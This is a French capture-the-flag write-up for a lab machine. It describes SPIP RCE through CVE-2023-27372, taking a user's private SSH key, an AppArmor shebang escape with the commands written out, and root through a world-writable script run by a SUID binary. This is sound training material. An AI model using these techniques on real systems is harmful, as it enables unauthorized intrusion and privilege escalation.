# Docs:

- https://github.com/nuts7/CVE-2023-27372

- https://cyberkhalid.github.io/posts/ssh-persist/

- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass

# Writeup

## RCE

Le site nous parle beaucoup de SPIP et en cherchant à peine on trouve de nombreux articles parlant de la **[CVE-2023-27372](https://github.com/nuts7/CVE-2023-27372)** sur les version < 4.2.1 de SPIP qui permet une **RCE** !

Le endpoint est: `/spip/spip.php?page=spip_pass`

## De www-data à think

On récupère un script qui exploite cette vulnérabilité et on l'améliore pour récupérer le retour des commandes injectés.

On essaie de choper un reverse shell mais rien ne marche...
On chope le premier flag un peu au dessus, dans **/home/think/user.txt**.
Mais on se souvient qu'il y a un serveur SSH sur la machine donc on jette un oeil au répertoire `/home/think/.ssh/` ! Dans le fichier `/home/think/.ssh/authorized_keys` on voit qu'il y a une clé SSH autorisée et il y a une clé privée dans `/home/think/.ssh/id_rsa`. On la récupère et on l'utilise:

```bash
chmod 400 thinkKey
ssh -i thinkKey think@10.10.99.125
```

Et ça fonctionne, on est devenu `think` !

### De think à root

On fait tourner linpeas sur la machine et plusieurs éléments ressortent:

- Fichier SUID étrange: **`/usr/sbin/run_container`**

- **AppArmor** est activé

On voit (avec strings) que `/usr/sbin/run_container` utilise `/opt/run_container.sh`. On peut lire ce fichier mais pas le modifier, ce qui est étrange car a priori on a les droits suffisants :

```bash
-rwxrwxrwx 1 root root 1723 Sep 25 22:16 /opt/run_container.sh
```

Et c'est à cause de AppArmor ! En regardant sa config dans `/etc/apparmor.d/` on trouve un fichier `usr.sbin.ash` qui sert à configurer des restrictions pour `/usr/sbin/ash` (notre shell !) :

```bash
#include <tunables/global>
/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

On voit bien que le contenu de `/opt/` est interdit en écriture (`deny /opt/** w`) mais seul le répertoire n'est pas autorisé en lecture (`deny /opt/ r`) (donc pas de `ls /opt`). On remarque aussi que bien qu'on ait pas le droit d'écrire sous `/tmp`, on a le droit d'écrire sous `/var/tmp`.

Il semblerait qu'on soit coincé... Mais en cherchant sur [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass), on trouve une vulnérabilité dans AppArmor ! L'exécution directe (ie sans spécifier l'exécuteur à utiliser) d'un script avec shebang permet de sortir du contexte restreint ! On écrit donc un script Bash qui nous donne un shell Bash (non Ash) et on l'exécute:

```bash
echo '#!/bin/bash
/bin/bash' > /var/tmp/test.sh
chmod +x /var/tmp/test.sh
/var/tmp/test.sh
```

La commande `ps` nous permet de voir qu'on utilise un bash mais c'est la commande `ls /opt` qui nous permet de assurer qu'on a bien réussi à sortir du contexte restreint de ash ! Il nous reste plus qu'à piéger le fichier `/opt/run_container.sh` en ajoutant `bash -p` dedans et à exécuter `run_container` (qui est SUID et appartient à root). Et le tour est joué nous voilà adminstrateur !
